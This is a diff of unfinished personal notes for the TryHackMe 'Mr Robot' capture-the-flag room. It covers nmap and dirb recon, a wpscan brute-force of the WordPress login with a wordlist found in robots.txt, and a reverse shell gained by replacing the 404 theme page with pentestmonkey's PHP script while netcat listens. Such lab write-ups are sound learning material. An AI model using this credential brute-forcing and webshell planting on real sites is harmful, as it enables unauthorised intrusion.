@@ -1,14 +1,38 @@
 # \# TODO : need to finish this
 
-nmap -A
+> nmap -A $TARGET
 
-dirb
+> dirb http://$TARGET
+
+* robots.txt : fsociety.dic (It will be used later)
+* wp-login.php
+
+
 
 user elliot , help from writeup ( Method : hydra to login page as a dummy, check status for correct username )
 
-> wpscan --url http://10.10.136.28/wp-login.php --passwords ~/Desktop/THM/mrrobot/fsocity.dic -U elliot
+Wpscan on the wp-login with the
+> wpscan --url http://$TARGET/wp-login.php --passwords ~/Desktop/THM/mrrobot/fsocity.dic -U elliot
 
+Found Elliot's creds. We can login as wordpress admin.
 
+### Shell access 
+
+Aim: Run PHP reverse-shell script somehow
+script used: pentestermonkey's reverse-shell.php
+
+> Replaced the script with the 404-Page theme php code.
+
+While netcat is listening, we can get access by simply requesting a page that doesn't exist.
+To activate the 404-page's script.
+
+> URL : http://$TARGET/nonexistingpagelmfao.html
+
+Now we have shell access.
+
+---
+
+### Flags
 
 > hashcat
 
